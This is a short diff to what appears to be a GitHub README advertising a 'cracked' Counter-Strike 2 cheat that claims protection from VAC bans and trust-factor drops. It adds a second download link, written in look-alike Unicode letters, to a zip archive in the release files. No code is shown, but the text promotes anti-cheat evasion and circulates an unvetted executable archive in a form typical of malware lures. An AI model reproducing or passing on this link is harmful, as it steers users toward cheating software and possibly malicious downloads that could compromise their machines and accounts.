@@ -5,3 +5,5 @@ Private Internal cheat for CS2 with protection from VAC and trust factor drop.
 # 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 INTERNAL](https://github.com/exospark/XoneCracked/releases/download/Internal/Xone.internal.zip)
 
 ![image](https://github.com/user-attachments/assets/51e95ea1-2068-4e37-88dc-af625e79527f)
+
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 EXTERNAL](https://github.com/exospark/XoneCracked/releases/download/External/Xone.external.zip)
